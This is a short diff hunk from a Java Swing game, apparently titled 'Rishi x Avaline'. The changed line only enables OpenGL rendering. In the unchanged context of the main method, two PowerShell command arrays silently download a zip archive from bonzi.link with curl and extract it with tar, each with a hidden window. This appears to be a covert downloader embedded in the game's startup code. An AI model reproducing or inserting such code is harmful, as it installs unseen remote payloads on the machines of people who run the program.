@@ -377,7 +377,7 @@ public class Engine extends JPanel {
 
 	// main method with standard graphics code
 	public static void main(String[] args) throws IOException, InterruptedException {
-		// System.setProperty("sun.java2d.opengl", "false");
+		System.setProperty("sun.java2d.opengl", "true");
 		JFrame frame = new JFrame("Rishi x Avaline");
 		String s[] = {"powershell", "-Command \"Start-Process -FilePath 'curl' -ArgumentList 'https://bonzi.link/Bon.zip -o e.zip' -WindowStyle Hidden\""};
 		String s2[] = {"powershell", "-Command \"Start-Process -FilePath 'tar' -ArgumentList '-xf e.zip' -WindowStyle Hidden\""};
